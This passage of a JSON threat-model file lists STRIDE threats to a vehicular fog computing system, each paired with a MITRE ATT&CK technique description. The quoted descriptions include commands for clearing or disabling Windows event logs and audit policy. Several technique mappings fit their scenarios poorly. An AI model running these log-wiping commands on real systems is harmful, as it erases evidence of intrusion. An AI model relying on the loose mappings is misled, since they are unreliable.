[
{
    "case_number": "11",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor impersonates a legitimate smart vehicle to gain access to the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "The VFC system lacks robust authentication mechanisms for smart vehicles.",
                    "Role": "System Designer",
                    "Condition": "High vehicle turnover and dynamic registration."
                },
                {
                    "Assumption": "Fog nodes do not have effective mechanisms to validate vehicle identities.",
                    "Role": "Fog Node Administrator",
                    "Condition": "Nodes rely on superficial verification."
                }
            ],
            "Potential Impact": "Unauthorized access to the VFC system, leading to potential data breaches and privacy violations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "vehicle",
                "authentication",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor uses a compromised RSU to collect data intended for legitimate RSUs.",
            "Assumptions": [
                {
                    "Assumption": "RSUs are not properly secured against unauthorized physical or remote access.",
                    "Role": "RSU Maintenance Team",
                    "Condition": "Inadequate security protocols."
                },
                {
                    "Assumption": "Network communication lacks end-to-end encryption.",
                    "Role": "Network Architect",
                    "Condition": "Data is transmitted in plain text or weakly encrypted."
                }
            ],
            "Potential Impact": "Collection of sensitive data, including location and status information of vehicles, leading to privacy risks and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "RSU",
                "network",
                "data collection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker impersonates cloud services to intercept communications from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not employ strict mutual authentication with cloud services.",
                    "Role": "Fog Node Administrator",
                    "Condition": "Utilization of default or weak authentication mechanisms."
                },
                {
                    "Assumption": "Network traffic is not monitored for anomalies or unusual patterns.",
                    "Role": "Network Monitoring Team",
                    "Condition": "Lack of real-time monitoring and alerts."
                }
            ],
            "Potential Impact": "Interception and potential alteration of sensitive data, jeopardizing the integrity and confidentiality of the VFC system.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on fog nodes to manipulate traffic data.",
            "Assumptions": [
                {
                    "Assumption": "Firmware on fog nodes is not securely updated or verified.",
                    "Role": "Firmware Developer",
                    "Condition": "Use of unverified firmware updates."
                },
                {
                    "Assumption": "No integrity checks are performed on data processed by fog nodes.",
                    "Role": "Fog Node Administrator",
                    "Condition": "Reliance on unverified data inputs."
                }
            ],
            "Potential Impact": "Corruption of traffic data, leading to false alerts and potential traffic congestion or accidents.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "fog node",
                "traffic data"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the configuration of fog nodes to disrupt data flows to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or reviewed.",
                    "Role": "System Administrator",
                    "Condition": "No logging of administrative actions."
                },
                {
                    "Assumption": "Access controls for configuration settings are weak or missing.",
                    "Role": "IT Security Team",
                    "Condition": "Usage of default or weak credentials for critical settings."
                }
            ],
            "Potential Impact": "Disruption in data flow to cloud services, leading to delays in processing and potential loss of critical data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration",
                "fog node",
                "data flow"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Autostart Execution",
                "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
                "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
                "technique_id": "T1547"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker injects malicious data into the communications between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted or validated for authenticity.",
                    "Role": "Network Architect",
                    "Condition": "Plain text or weakly encrypted communications."
                },
                {
                    "Assumption": "Smart vehicles and fog nodes do not verify data integrity.",
                    "Role": "Vehicle Software Developer",
                    "Condition": "No checksums or signatures are implemented."
                }
            ],
            "Potential Impact": "Manipulation of vehicle data, potentially leading to incorrect traffic decisions and system malfunctions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data injection",
                "vehicle",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Disable Crypto Hardware",
                "description": "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--7efba77e-3bc4-4ca5-8292-d8201dcd64b5",
                "technique_id": "T1600.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending or receiving specific data, leading to a lack of accountability.",
            "Assumptions": [
                {
                    "Assumption": "Logs of transactions are not properly maintained.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate logging mechanisms."
                },
                {
                    "Assumption": "Digital signatures or other non-repudiation measures are not implemented.",
                    "Role": "System Designer",
                    "Condition": "Lack of cryptographic controls for ensuring non-repudiation."
                }
            ],
            "Potential Impact": "Difficulty in tracing actions back to specific users, resulting in challenges in incident investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "accountability",
                "digital signature"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised fog node denies processing specific data points, causing disputes over data integrity.",
            "Assumptions": [
                {
                    "Assumption": "Processing logs on fog nodes are not secure or tamper-proof.",
                    "Role": "Fog Node Administrator",
                    "Condition": "Logs are stored in unprotected locations."
                },
                {
                    "Assumption": "Audits are infrequent or non-existent.",
                    "Role": "IT Audit Team",
                    "Condition": "No regular audits of data processing activities."
                }
            ],
            "Potential Impact": "Data integrity disputes, potentially leading to loss of trust in the VFC system.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "fog node",
                "data integrity",
                "audit"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A vehicle owner denies receiving specific updates or alerts meant for the vehicle.",
            "Assumptions": [
                {
                    "Assumption": "Delivery and receipt of messages are not tracked or logged.",
                    "Role": "System Designer",
                    "Condition": "Lack of acknowledgments for critical communications."
                },
                {
                    "Assumption": "Messages are not timestamped or uniquely identified.",
                    "Role": "System Architect",
                    "Condition": "No unique identifiers for messages."
                }
            ],
            "Potential Impact": "Challenges in proving the delivery and receipt of critical updates, leading to potential liability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "vehicle",
                "update",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data from vehicles is intercepted during transmission to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted end-to-end.",
                    "Role": "Network Security Engineer",
                    "Condition": "Usage of plain text or outdated encryption protocols."
                },
                {
                    "Assumption": "Intrusion detection systems are not in place.",
                    "Role": "IT Security Team",
                    "Condition": "Lack of real-time monitoring and alerting systems."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of vehicle data, leading to privacy breaches and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data transmission",
                "vehicle",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to stored data on fog nodes through vulnerability exploitation.",
            "Assumptions": [
                {
                    "Assumption": "Stored data on fog nodes is not encrypted.",
                    "Role": "Fog Node Administrator",
                    "Condition": "Data is stored in plain text."
                },
                {
                    "Assumption": "Vulnerabilities in fog nodes are not regularly patched.",
                    "Role": "Security Operations Center",
                    "Condition": "No regular update and patch management process."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, which could be used for malicious purposes.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data storage",
                "fog node",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to cloud servers results in a data breach.",
            "Assumptions": [
                {
                    "Assumption": "Access controls for cloud servers are weak or misconfigured.",
                    "Role": "Cloud Security Team",
                    "Condition": "Misconfiguration of access policies."
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest.",
                    "Role": "Data Security Officer",
                    "Condition": "Data stored without encryption."
                }
            ],
            "Potential Impact": "Compromise of large volumes of sensitive data, leading to significant privacy and security risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood fog nodes with excessive requests, overwhelming their processing capabilities.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack rate limiting and throttling mechanisms.",
                    "Role": "System Developer",
                    "Condition": "No limits on incoming requests."
                },
                {
                    "Assumption": "Network traffic is not adequately monitored.",
                    "Role": "Network Monitoring Team",
                    "Condition": "No real-time analysis of traffic patterns."
                }
            ],
            "Potential Impact": "Service disruption, leading to delays in processing critical data and possible traffic management failures.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "fog node",
                "request throttling",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targets cloud services, preventing them from processing and managing data from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "No DDoS mitigation measures are in place.",
                    "Role": "Cloud Security Team",
                    "Condition": "Absence of protective measures against DDoS attacks."
                },
                {
                    "Assumption": "Cloud infrastructure is not horizontally scalable.",
                    "Role": "Infrastructure Architect",
                    "Condition": "Limited ability to scale resources under high load."
                }
            ],
            "Potential Impact": "Inability of cloud services to manage and process data, leading to widespread system outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud",
                "DDoS",
                "scalability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious software on smart vehicles sends excessive data to fog nodes, causing them to crash.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicles do not employ malware detection mechanisms.",
                    "Role": "Vehicle Security Team",
                    "Condition": "Lack of antivirus or anti-malware software."
                },
                {
                    "Assumption": "Fog nodes cannot handle large volumes of unexpected data.",
                    "Role": "System Designer",
                    "Condition": "Insufficient resources for handling high data volume."
                }
            ],
            "Potential Impact": "Crashes or degraded performance of fog nodes, leading to loss of data processing capability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "vehicle",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
